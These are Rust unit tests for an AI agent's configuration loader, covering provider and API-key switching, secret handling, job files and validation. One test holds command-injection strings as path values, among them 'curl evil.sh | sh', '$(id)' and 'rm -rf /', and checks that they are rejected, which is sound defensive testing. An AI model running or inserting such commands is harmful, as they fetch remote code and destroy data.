            found,
            nested.join("config.toml"),
            "an upgrade must not silently lose an existing config and claim there is no API key"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_vendor_namespace_matching_the_current_provider_is_kept_in_the_model_id() {
        let mut cfg = base();
        cfg.provider = "nvidia".into();
        retarget(&mut cfg, "nvidia/nemotron-3-super-120b-a12b");
        assert_eq!(cfg.provider, "nvidia");
        assert_eq!(
            cfg.model, "nvidia/nemotron-3-super-120b-a12b",
            "the vendor namespace is part of the model id; stripping it made the API return 404"
        );
    }

    #[test]
    fn namespaced_providers_keep_other_vendor_prefixes_too() {
        for (provider, spec) in [
            ("openrouter", "openrouter/auto"),
            ("together", "together/some-model"),
            ("novita", "novita/some-model"),
        ] {
            let mut cfg = base();
            cfg.provider = provider.into();
            retarget(&mut cfg, spec);
            assert_eq!(cfg.provider, provider);
            assert_eq!(cfg.model, spec, "{provider} must keep its namespace");
        }
    }

    #[test]
    fn switching_to_a_different_provider_still_strips_that_prefix() {
        let mut cfg = base();
        cfg.provider = "nvidia".into();
        retarget(&mut cfg, "openai/gpt-5");
        assert_eq!(cfg.provider, "openai");
        assert_eq!(cfg.model, "gpt-5");
    }

    #[test]
    fn every_provider_kind_resolves_a_key_var_or_needs_no_key() {
        for kind in PROVIDER_KINDS {
            if *kind == "ollama" || *kind == "custom" || *kind == "openai" {
                continue;
            }
            assert!(
                !provider_key_vars(kind).is_empty(),
                "{kind} has no environment variable, so a key can never be found for it"
            );
        }
    }

    #[test]
    fn switching_provider_picks_up_that_providers_configured_keys() {
        let mut cfg = base();
        cfg.provider_keys = vec![(
            "openai".into(),
            vec!["openai-first".into(), "openai-second".into()],
        )];
        switch_provider(&mut cfg, "openai");
        assert_eq!(cfg.api_key, "openai-first");
        assert_eq!(cfg.api_keys, vec!["openai-second".to_string()]);
    }

    #[test]
    fn jobs_d_files_load_sorted_and_collide_loudly() {
        let d = std::env::temp_dir().join(format!(
            "px-jobsd-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        std::fs::write(
            d.join("20-second.toml"),
            "cron = \"0 8 * * *\"\nprompt = \"second\"\n",
        )
        .unwrap();
        std::fs::write(
            d.join("10-first.toml"),
            "name = \"first\"\ncron = \"0 7 * * *\"\nprompt = \"first\"\ncan_act = false\n",
        )
        .unwrap();
        std::fs::write(d.join("ignored.txt"), "not toml").unwrap();
        let jobs = jobs_from_dir(&d).unwrap();
        assert_eq!(jobs.len(), 2);
        assert_eq!(jobs[0].name, "first", "files load in sorted order");
        assert!(!jobs[0].can_act);
        assert_eq!(
            jobs[1].name, "20-second",
            "a missing name falls back to the file stem"
        );
        assert!(jobs[1].can_act);

        std::fs::write(d.join("30-bad.toml"), "cron = \"0 9 * * *\"\n").unwrap();
        let err = jobs_from_dir(&d).unwrap_err();
        assert!(
            err.contains("cron and prompt (or script) are required"),
            "{err}"
        );
        std::fs::remove_file(d.join("30-bad.toml")).unwrap();

        std::fs::write(
            d.join("40-typo.toml"),
            "cron = \"0 9 * * *\"\nprompt = \"x\"\nwebook = \"y\"\n",
        )
        .unwrap();
        let err = jobs_from_dir(&d).unwrap_err();
        assert!(err.contains("unknown key webook"), "{err}");

        assert!(
            jobs_from_dir(std::path::Path::new("/nonexistent-jobs-d"))
                .unwrap()
                .is_empty(),
            "a missing directory is simply no jobs"
        );
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn update_check_hours_parses_and_rejects_nonsense() {
        let cfg =
            parse("[provider]\nkind = \"openai\"\nmodel = \"m\"\n\n[update]\ncheck_hours = 24\n")
                .unwrap();
        assert_eq!(cfg.update_check_hours, 24);
        let cfg = parse("[provider]\nkind = \"openai\"\nmodel = \"m\"\n").unwrap();
        assert_eq!(cfg.update_check_hours, 0, "omitted means disabled");
        let err =
            parse("[provider]\nkind = \"openai\"\nmodel = \"m\"\n\n[update]\ncheck_hours = 500\n")
                .unwrap_err();
        assert!(err.contains("check_hours"), "{err}");
    }

    #[test]
    fn job_can_act_defaults_true_and_inherits_the_job_defaults_value() {
        let raw = "[provider]\nkind = \"openai\"\nmodel = \"m\"\n\n[[jobs]]\nname = \"a\"\ncron = \"* * * * *\"\nprompt = \"p\"\n";
        let cfg = parse(raw).unwrap();
        assert!(cfg.jobs[0].can_act, "jobs act by default");

        let raw = "[provider]\nkind = \"openai\"\nmodel = \"m\"\n\n[job_defaults]\ncan_act = false\n\n[[jobs]]\nname = \"a\"\ncron = \"* * * * *\"\nprompt = \"p\"\n\n[[jobs]]\nname = \"b\"\ncron = \"* * * * *\"\nprompt = \"p\"\ncan_act = true\n";
        let cfg = parse(raw).unwrap();
        assert!(!cfg.jobs[0].can_act, "the default flows into silent jobs");
        assert!(cfg.jobs[1].can_act, "an explicit per-job value wins");
    }

    #[test]
    fn a_job_model_override_parses_and_defaults_empty() {
        let raw = "[provider]\nkind = \"openai\"\nmodel = \"m\"\n\n[[jobs]]\nname = \"a\"\ncron = \"* * * * *\"\nprompt = \"p\"\nmodel = \"anthropic/claude-x\"\n\n[[jobs]]\nname = \"b\"\ncron = \"* * * * *\"\nprompt = \"p\"\n";
        let cfg = parse(raw).unwrap();
        assert_eq!(cfg.jobs[0].model, "anthropic/claude-x");
        assert_eq!(cfg.jobs[1].model, "", "no override means the serve model");
    }

    #[test]
    fn provider_timeout_parses_and_rejects_nonsense() {
        let cfg =
            parse("[provider]\nkind = \"openai\"\nmodel = \"m\"\ntimeout_secs = 45\n").unwrap();
        assert_eq!(cfg.provider_timeout_secs, 45);
        let cfg = parse("[provider]\nkind = \"openai\"\nmodel = \"m\"\n").unwrap();
        assert_eq!(
            cfg.provider_timeout_secs, 0,
            "omitted means built-in ceilings"
        );
        let err = parse("[provider]\nkind = \"openai\"\nmodel = \"m\"\ntimeout_secs = 9999\n")
            .unwrap_err();
        assert!(err.contains("timeout_secs"), "{err}");
    }

    #[test]
    fn secret_values_collects_every_configured_credential_once() {
        let mut cfg = base();
        cfg.api_key = "anthropic-key".into();
        cfg.api_keys = vec!["anthropic-spare".into(), "anthropic-key".into()];
        cfg.provider_keys = vec![("openai".into(), vec!["openai-first".into()])];
        cfg.provider_headers = vec![
            ("Authorization".into(), "custom-auth-value".into()),
            ("X-Trace".into(), "not-secret".into()),
        ];
        cfg.mcp_servers = vec![crate::mcp::ServerCfg {
            env: vec![
                ("SERVICE_TOKEN".into(), "mcp-secret-value".into()),
                ("LANG".into(), "en_US".into()),
            ],
            ..crate::mcp::ServerCfg::default()
        }];
        cfg.telegram_token = "tg-token-123".into();
        cfg.http_pass = "basic-pass".into();
        let vals = cfg.secret_values();
        assert!(vals.contains(&"anthropic-key".to_string()));
        assert!(vals.contains(&"anthropic-spare".to_string()));
        assert!(vals.contains(&"openai-first".to_string()));
        assert!(vals.contains(&"custom-auth-value".to_string()));
        assert!(vals.contains(&"mcp-secret-value".to_string()));
        assert!(!vals.contains(&"not-secret".to_string()));
        assert!(!vals.contains(&"en_US".to_string()));
        assert!(vals.contains(&"tg-token-123".to_string()));
        assert!(vals.contains(&"basic-pass".to_string()));
        assert_eq!(
            vals.iter().filter(|v| *v == "anthropic-key").count(),
            1,
            "duplicates collapse"
        );
    }

    #[test]
    fn switching_provider_drops_the_old_dialect_override() {
        let mut cfg = base();
        cfg.api = "anthropic-messages".into();
        switch_provider(&mut cfg, "openai");
        assert_eq!(cfg.api, "");
        assert_eq!(cfg.base_url, "");
    }

    #[test]
    fn switching_to_the_same_provider_is_a_no_op() {
        let mut cfg = base();
        switch_provider(&mut cfg, "anthropic");
        assert_eq!(cfg.api_key, "anthropic-key");
        assert_eq!(cfg.api_keys, vec!["anthropic-spare".to_string()]);
        assert_eq!(cfg.base_url, "https://anthropic.example");
    }
}

#[cfg(test)]
mod env_ref_tests {
    use super::*;

    fn fake<'a>(pairs: &'a [(&'a str, &'a str)]) -> impl Fn(&str) -> Option<String> + 'a {
        move |k: &str| {
            pairs
                .iter()
                .find(|(name, _)| *name == k)
                .map(|(_, v)| (*v).to_string())
        }
    }

    #[test]
    fn a_reference_is_replaced_by_the_environment_value() {
        let env = fake(&[("MY_TOKEN", "sekrit")]);
        assert_eq!(expand_env_refs("${MY_TOKEN}", &env), "sekrit");
        assert_eq!(
            expand_env_refs("Bearer ${MY_TOKEN} end", &env),
            "Bearer sekrit end"
        );
    }

    #[test]
    fn an_unset_reference_is_left_intact_rather_than_becoming_empty() {
        let env = fake(&[]);
        assert_eq!(expand_env_refs("${NOT_SET}", &env), "${NOT_SET}");
        assert_eq!(
            expand_env_refs("prefix-${NOT_SET}-suffix", &env),
            "prefix-${NOT_SET}-suffix"
        );
    }

    #[test]
    fn a_doubled_dollar_escapes_the_reference() {
        let env = fake(&[("MY_TOKEN", "sekrit")]);
        assert_eq!(expand_env_refs("$${MY_TOKEN}", &env), "${MY_TOKEN}");
    }

    #[test]
    fn text_without_a_valid_reference_is_untouched() {
        let env = fake(&[("MY_TOKEN", "sekrit")]);
        for raw in [
            "plain value",
            "cost is $5",
            "$notbraced",
            "${lowercase}",
            "${9LEADING}",
            "${WITH-DASH}",
            "${unterminated",
            "${}",
        ] {
            assert_eq!(expand_env_refs(raw, &env), raw, "changed {raw:?}");
        }
    }

    #[test]
    fn multibyte_text_is_not_corrupted() {
        let env = fake(&[("NAME", "phoenix")]);
        assert_eq!(
            expand_env_refs("\u{6f22}\u{5b57} ${NAME} \u{1f525}", &env),
            "\u{6f22}\u{5b57} phoenix \u{1f525}"
        );
    }

    #[test]
    fn config_strings_and_lists_resolve_references_at_load() {
        std::env::set_var("PHX_TEST_TOKEN", "from-env");
        std::env::set_var("PHX_TEST_CHAT", "12345");
        let raw = "[telegram]\n\
token = \"${PHX_TEST_TOKEN}\"\n\
allowed_chat_ids = [\"${PHX_TEST_CHAT}\", \"static\"]\n";
        let cfg = parse(raw).expect("parses");
        assert_eq!(cfg.telegram_token, "from-env");
        assert_eq!(cfg.telegram_allowed, vec!["12345", "static"]);
        std::env::remove_var("PHX_TEST_TOKEN");
        std::env::remove_var("PHX_TEST_CHAT");
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn defaults_validate() {
        assert!(Config::default().validate().is_ok());
    }

    #[test]
    fn log_level_defaults_parses_and_rejects_invalid_values() {
        assert_eq!(Config::default().log_level, "error");
        for level in LOG_LEVELS {
            let cfg = parse(&format!("[log]\nlevel = {level:?}\n")).expect("valid log level");
            assert_eq!(cfg.log_level, level);
        }
        let err = parse("[log]\nlevel = \"trace\"\n").unwrap_err();
        assert!(err.contains("log.level"), "{err}");
    }

    #[test]
    fn log_level_is_declared_in_the_json_schema() {
        let schema = json_schema();
        let level = &schema["properties"]["log"]["properties"]["level"];
        assert_eq!(level["type"], "string");
        assert_eq!(
            level["enum"],
            serde_json::json!(["off", "error", "warn", "info", "debug"])
        );
        assert!(unknown_keys("[log]\nlevel = \"debug\"\n").is_empty());
    }

    #[test]
    fn inline_secrets_are_lifted_out_of_an_existing_config() {
        let raw = r#"[provider]
kind = "anthropic"
model = "claude-fable-5"
api_key = "sk-ant-live"

[agent]
sessions = true

[telegram]
token = "123:bot"
allowed_chat_ids = ["1868769425"]

[provider.keys]
anthropic = ["sk-ant-live"]
openrouter = ["sk-or-1", "sk-or-2"]
"#;
        let (cleaned, found) = strip_inline_secrets(raw);
        for secret in ["sk-ant-live", "123:bot", "sk-or-1", "sk-or-2"] {
            assert!(
                !cleaned.contains(secret),
                "{secret} must be stripped: {cleaned}"
            );
        }
        assert!(
            cleaned.contains("kind = \"anthropic\"") && cleaned.contains("sessions = true"),
            "non-secret settings must survive: {cleaned}"
        );
        assert!(
            cleaned.contains("allowed_chat_ids = [\"1868769425\"]"),
            "an allowlist is not a secret: {cleaned}"
        );
        let get = |n: &str| {
            found
                .iter()
                .find(|(k, _)| k == n)
                .map(|(_, v)| v.clone())
                .unwrap_or_default()
        };
        assert_eq!(get("PHOENIX_TELEGRAM_TOKEN"), vec!["123:bot".to_string()]);
        assert_eq!(
            get("OPENROUTER_API_KEY"),
            vec!["sk-or-1".to_string(), "sk-or-2".to_string()],
            "the whole rotation ring carries, not just the first key"
        );
    }

    #[test]
    fn a_config_without_secrets_is_left_alone() {
        let raw = "[provider]\nkind = \"ollama\"\nmodel = \"llama3.3\"\n";
        let (cleaned, found) = strip_inline_secrets(raw);
        assert!(found.is_empty(), "nothing to lift: {found:?}");
        assert_eq!(cleaned.trim(), raw.trim());
    }

    #[test]
    fn switching_provider_finds_the_key_in_the_encrypted_store() {
        let _g = crate::secrets::test_env_lock();
        let d = std::env::temp_dir().join(format!("phx-switch-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        std::env::set_var("PHOENIX_STATE_DIR", &d);
        std::env::set_var(crate::secrets::KEY_VAR, "test-passphrase");
        for v in ["PHOENIX_API_KEY", "NVIDIA_API_KEY"] {
            std::env::remove_var(v);
        }
        crate::secrets::stash_named(&[(
            "NVIDIA_API_KEY".to_string(),
            vec!["nv-one".to_string(), "nv-two".to_string()],
        )])
        .unwrap();

        let mut cfg = Config {
            provider: "anthropic".into(),
            api_key: "ant-key".into(),
            ..Config::default()
        };
        switch_provider(&mut cfg, "nvidia");
        assert_eq!(
            cfg.api_key, "nv-one",
            "a fallback switch must read the encrypted store, not only the environment, \
 or the fallback fires with no key"
        );
        assert_eq!(
            cfg.api_keys,
            vec!["nv-two".to_string()],
            "the rotation ring comes along too"
        );

        std::env::remove_var("PHOENIX_STATE_DIR");
        std::env::remove_var(crate::secrets::KEY_VAR);
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn every_channel_secret_can_come_from_the_environment() {
        let _g = crate::secrets::test_env_lock();
        for (var, _, field) in SECRET_FIELDS {
            std::env::set_var(var, format!("env-{var}"));
            let mut cfg = Config::default();
            let got = crate::secrets::resolve_chain("", var, "unused-name");
            std::env::remove_var(var);
            assert_eq!(
                got,
                Some(format!("env-{var}")),
                "{var} must be injectable from the environment, the way a container does it"
            );
            *field(&mut cfg) = got.unwrap();
        }
    }

    #[test]
    fn no_channel_secret_is_left_without_an_env_var_and_store_name() {
        for (var, name, _) in SECRET_FIELDS {
            assert!(
                var.starts_with("PHOENIX_"),
                "{var} should be a PHOENIX_* variable"
            );
            assert!(!name.is_empty(), "{var} needs a secret store name");
        }
        for want in [
            "PHOENIX_MATRIX_TOKEN",
            "PHOENIX_MATTERMOST_TOKEN",
            "PHOENIX_HTTP_PASS",
            "PHOENIX_WHATSAPP_VERIFY_TOKEN",
        ] {
            assert!(
                SECRET_FIELDS.iter().any(|(v, _, _)| *v == want),
                "{want} is a secret too; it must resolve from env or the store like the rest"
            );
        }
    }

    #[test]
    fn a_hostile_cli_path_is_refused_at_config_load() {
        let cfg = Config {
            signal_cli_path: "signal-cli; curl evil.sh | sh".into(),
            ..Config::default()
        };
        let e = cfg.validate().expect_err("must reject");
        assert!(e.contains("signal.cli_path"), "{e}");

        let cfg = Config {
            browser_binary: "$(id)".into(),
            ..Config::default()
        };
        assert!(cfg.validate().is_err());

        let cfg = Config {
            imessage_cli_path: "imsg\nrm -rf /".into(),
            ..Config::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn ordinary_cli_paths_still_load() {
        let cfg = Config {
            signal_cli_path: "signal-cli".into(),
            imessage_cli_path: "/usr/local/bin/imsg".into(),
            browser_binary: "chromium".into(),
            ..Config::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn provider_key_vars_cover_known_providers() {
        assert_eq!(provider_key_vars("anthropic"), ["ANTHROPIC_API_KEY"]);
        assert_eq!(provider_key_vars("openai"), ["OPENAI_API_KEY"]);
        assert_eq!(provider_key_vars("custom"), ["OPENAI_API_KEY"]);
        assert_eq!(provider_key_vars("openrouter"), ["OPENROUTER_API_KEY"]);
        assert_eq!(provider_key_vars("nvidia"), ["NVIDIA_API_KEY"]);
        assert_eq!(
            provider_key_vars("google"),
            ["GEMINI_API_KEY", "GOOGLE_API_KEY"]
        );

        assert!(provider_key_vars("ollama").is_empty());
        assert!(provider_key_vars("weird").is_empty());
    }

    #[test]
    fn first_env_provider_only_names_a_provider_that_actually_has_a_key() {
        if let Some(p) = first_env_provider() {
            assert!(PROVIDER_KINDS.contains(&p), "{p} is a real provider kind");
            assert_ne!(p, "custom");
            assert_ne!(p, "ollama");
            assert!(
                provider_key_vars(p)
                    .iter()
                    .any(|v| env::var(v).map(|s| !s.is_empty()) == Ok(true)),
                "{p} was returned but has no key var set"
            );
        }
    }

    #[test]
    fn parses_v060_fields() {
        let cfg = parse(
            r#"
[provider]
kind = "openai"
api_keys = ["k2", "k3"]

[telegram]
allowed_chat_ids = ["1"]
group_mention_only = false

[audio]
transcribe = true
model = "whisper-large"
base_url = "http://local/v1"

[[jobs]]
name = "brief"
cron = "0 7 * * *"
prompt = "p"
webhook = "http://127.0.0.1:9/hook"
"#,
        )
        .unwrap();
        assert_eq!(cfg.api_keys, vec!["k2", "k3"]);
        assert!(!cfg.tg_group_mention_only);
        assert!(cfg.audio_transcribe);
        assert_eq!(cfg.audio_model, "whisper-large");
        assert_eq!(cfg.audio_base_url, "http://local/v1");
        assert_eq!(cfg.jobs[0].webhook, "http://127.0.0.1:9/hook");
    }

    #[test]
    fn v060_defaults() {
        let cfg = parse("").unwrap();
        assert!(cfg.api_keys.is_empty());
        assert!(cfg.tg_group_mention_only);
        assert!(!cfg.audio_transcribe);
        assert_eq!(cfg.audio_model, "whisper-1");
        let cfg = parse("[[jobs]]\nname = \"j\"\ncron = \"* * * * *\"\nprompt = \"p\"\n").unwrap();
        assert!(cfg.jobs[0].webhook.is_empty());
    }

    #[test]
    fn bad_privacy_rejected() {
        let cfg = Config {
            privacy: "loud".into(),
            ..Config::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn bad_lean_rejected() {
        let cfg = Config {
            lean: "max".into(),
            ..Config::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn parse_full_file() {
        let cfg = parse(
            r#"
[provider]
kind = "openrouter"
model = "gpt-x"
api_key = "file-key"
[agent]
privacy = "recall"
lean = "grunt"
workspace = "/tmp/px-ws"
[security]
confirm_shell = false
allow_outside_workspace = true
deny_commands = ["foo"]
[telegram]
token = "tok"
allowed_chat_ids = [123, "456"]
[http]
enabled = true
port = 9911
token = "htok"
[[jobs]]
name = "j1"
cron = "0 7 * * *"
prompt = "hello"
chat_ids = [777]
"#,
        )
        .unwrap();
        assert_eq!(cfg.provider, "openrouter");
        assert_eq!(cfg.model, "gpt-x");
        assert_eq!(cfg.api_key, "file-key");
        assert_eq!(cfg.privacy, "recall");
        assert_eq!(cfg.lean, "grunt");
        assert_eq!(cfg.workspace, PathBuf::from("/tmp/px-ws"));
        assert!(!cfg.confirm_shell);
        assert!(cfg.allow_outside_workspace);
        assert_eq!(cfg.deny_commands, vec!["foo".to_string()]);
        assert_eq!(cfg.telegram_token, "tok");
        assert_eq!(
            cfg.telegram_allowed,
            vec!["123".to_string(), "456".to_string()]
        );
        assert_eq!(cfg.jobs.len(), 1);
        assert_eq!(cfg.jobs[0].cron, "0 7 * * *");
        assert_eq!(cfg.jobs[0].chat_ids, vec!["777".to_string()]);
        assert!(cfg.http_enabled);
        assert_eq!(cfg.http_port, 9911);
        assert_eq!(cfg.http_token, "htok");
    }

    #[test]
    fn parse_new_keys() {
        let cfg = parse(
            "[provider]\nfallbacks = [\"m2\", \"m3\"]\n[agent]\nsessions = true\nstream = true\n",
        )
        .unwrap();
        assert_eq!(cfg.fallbacks, vec!["m2".to_string(), "m3".to_string()]);
        assert!(cfg.sessions);
        assert!(cfg.stream);
        assert!(!cfg.http_enabled);
        assert_eq!(cfg.http_port, 8787);
    }

    #[test]
    fn bad_http_port_rejected() {
        assert!(parse("[http]\nport = 0\n").is_err());
        assert!(parse("[http]\nport = 70000\n").is_err());
        assert!(parse("[whatsapp]\nwebhook_port = 0\n").is_err());
    }

    #[test]
    fn parse_whatsapp_table() {
        let cfg = parse(
            "[whatsapp]\ntoken = \"wt\"\nphone_id = \"55\"\nverify_token = \"vv\"\nallowed_numbers = [4915551234567]\n",
        )
        .unwrap();
        assert_eq!(cfg.wa_token, "wt");
        assert_eq!(cfg.wa_phone_id, "55");
        assert_eq!(cfg.wa_verify_token, "vv");
        assert_eq!(cfg.wa_allowed, vec!["4915551234567".to_string()]);
        assert_eq!(cfg.wa_webhook_port, 8788);
    }

    #[test]
    fn parse_empty_gives_defaults() {
        let cfg = parse("").unwrap();

        assert_eq!(cfg.provider, "openai");
        assert_eq!(cfg.model, "gpt-5.6-sol");
        assert_eq!(cfg.privacy, "session");
        assert!(cfg.telegram_allowed.is_empty());
    }

    #[test]
    fn approvals_default_off_opt_in() {
        assert!(!Config::default().approvals);
        assert!(!parse("").unwrap().approvals);
        assert!(parse("[security]\napprovals = true\n").unwrap().approvals);
    }

    #[test]
    fn parse_heartbeat_table() {
        let cfg = parse("[heartbeat]\nminutes = 30\nchat_ids = [42]\n").unwrap();
        assert_eq!(cfg.heartbeat_minutes, 30);
        assert_eq!(cfg.heartbeat_prompt, HEARTBEAT_PROMPT);
        assert_eq!(cfg.heartbeat_chat_ids, vec!["42".to_string()]);
        let custom = parse("[heartbeat]\nminutes = 5\nprompt = \"check disk\"\n").unwrap();
        assert_eq!(custom.heartbeat_prompt, "check disk");
        assert!(parse("[heartbeat]\nminutes = -1\n").is_err());
    }

    #[test]
    fn heartbeat_defaults_disabled() {
        let cfg = parse("").unwrap();
        assert_eq!(cfg.heartbeat_minutes, 0);
        assert_eq!(cfg.heartbeat_prompt, HEARTBEAT_PROMPT);
        assert!(cfg.heartbeat_chat_ids.is_empty());
    }

    #[test]
    fn parse_compact_after() {
        assert_eq!(parse("").unwrap().compact_after, 0);
        let cfg = parse("[agent]\ncompact_after = 40\n").unwrap();
        assert_eq!(cfg.compact_after, 40);
        assert!(parse("[agent]\ncompact_after = -2\n").is_err());
    }

    #[test]
    fn parse_memory_table() {
        let cfg = parse("").unwrap();
        assert!(!cfg.mem_embeddings);
        assert_eq!(cfg.mem_embed_model, "text-embedding-3-small");
        assert_eq!(cfg.mem_embed_base_url, "");
        let cfg = parse(
            "[memory]\nembeddings = true\nembed_model = \"m-embed\"\nembed_base_url = \"http://x.local/v1\"\n",
        )
        .unwrap();
        assert!(cfg.mem_embeddings);
        assert_eq!(cfg.mem_embed_model, "m-embed");
        assert_eq!(cfg.mem_embed_base_url, "http://x.local/v1");
    }

    #[test]
    fn parse_rejects_bad_values() {
        assert!(parse("[agent]\nprivacy = \"loud\"\n").is_err());
        assert!(parse("[agent]\nlean = \"max\"\n").is_err());
        assert!(parse("not valid toml [").is_err());
    }

    #[test]
    fn sample_config_parses() {
        assert!(parse(SAMPLE_CONFIG).is_ok());
    }

    #[test]
    fn browser_defaults_off() {
        let cfg = parse("").unwrap();
        assert!(!cfg.browser_enabled);
        assert!(cfg.browser_cdp_url.is_empty());
        assert!(cfg.browser_binary.is_empty());
        assert!(cfg.browser_headless);
    }

    #[test]
    fn parse_browser_table() {
        let cfg = parse(
            "[browser]\nenabled = true\ncdp_url = \"http://127.0.0.1:9222\"\nbinary = \"/opt/chrome\"\nheadless = false\n",
        )
        .unwrap();
        assert!(cfg.browser_enabled);
        assert_eq!(cfg.browser_cdp_url, "http://127.0.0.1:9222");
        assert_eq!(cfg.browser_binary, "/opt/chrome");
        assert!(!cfg.browser_headless);
    }

    #[test]
    fn expanduser_tilde() {
        assert_eq!(expanduser("~/x"), home_dir().join("x"));
        assert_eq!(expanduser("/abs"), PathBuf::from("/abs"));
    }

    #[test]
    fn sample_config_has_no_unknown_keys() {
        assert!(unknown_keys(SAMPLE_CONFIG).is_empty());
    }

    #[test]
    fn unknown_keys_catch_typos() {
        let raw = "[provider]\nmodle = \"oops\"\n\n[telegramm]\ntoken = \"x\"\n";
        let bad = unknown_keys(raw);
        assert!(bad.contains(&"provider.modle".to_string()), "{bad:?}");
        assert!(bad.contains(&"telegramm".to_string()), "{bad:?}");
    }

    #[test]
    fn misplaced_keys_point_home() {
        assert_eq!(
            misplaced_hint("telegram.api_key").as_deref(),
            Some("did you mean [provider] api_key?")
        );
        let token_hint = misplaced_hint("provider.token").expect("token lives somewhere");
        assert!(token_hint.contains("[telegram]"), "{token_hint}");
        assert!(misplaced_hint("telegram.bogus_zzz").is_none());
        assert!(misplaced_hint("toplevel").is_none());
    }

    #[test]
    fn unknown_keys_check_jobs_entries() {
        let raw =
            "[[jobs]]\nname = \"a\"\ncron = \"* * * * *\"\nprompt = \"p\"\nwebook = \"typo\"\n";
        let bad = unknown_keys(raw);
        assert_eq!(bad, vec!["jobs[0].webook".to_string()]);
    }

    #[test]
    fn unknown_keys_clean_on_full_valid_config() {
        let raw =
            "[provider]\nkind = \"openai\"\n\n[agent]\nlean = \"off\"\n\n[canvas]\nenabled = true\n";
        assert!(unknown_keys(raw).is_empty());
    }
}
